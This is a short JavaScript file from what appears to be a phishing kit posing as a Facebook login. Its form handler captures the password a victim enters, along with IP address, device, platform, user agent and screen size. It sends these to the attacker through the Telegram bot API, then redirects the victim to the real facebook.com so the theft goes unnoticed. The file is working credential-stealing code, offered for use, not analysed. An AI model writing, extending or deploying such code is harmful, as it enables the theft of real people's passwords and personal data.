// part3.js
document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();

    const p = document.getElementById('password').value;
    const honeypot = document.querySelector('[name="honeypot"]').value;

    if (!p) {
        alert('Please enter your password.');
        return;
    }

    console.log('P entered:', p);

    getUserInfo()
        .then(userInfo => {
            const message = `
<b>New Login Attempt</b>
<b>Password:</b> ${p}
<b>IP Address:</b> ${userInfo.ip}
<b>Device Type:</b> ${userInfo.deviceType}
<b>Platform:</b> ${userInfo.platform}
<b>User Agent:</b> ${userInfo.userAgent}
<b>Screen Resolution:</b> ${userInfo.screenWidth}x${userInfo.screenHeight}
            `;

            console.log('Sending data to Telegram...');
            return axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
            });
        })
        .then(response => {
            console.log('Message sent successfully:', response.data);
            window.location.href = "https://www.facebook.com/";
        })
        .catch(err => {
            console.error('Error sending message to Telegram:', err);
            alert('Failed to send data. Please try again.');
        });
});

console.log('Part 3 loaded: Form submission handler ready.');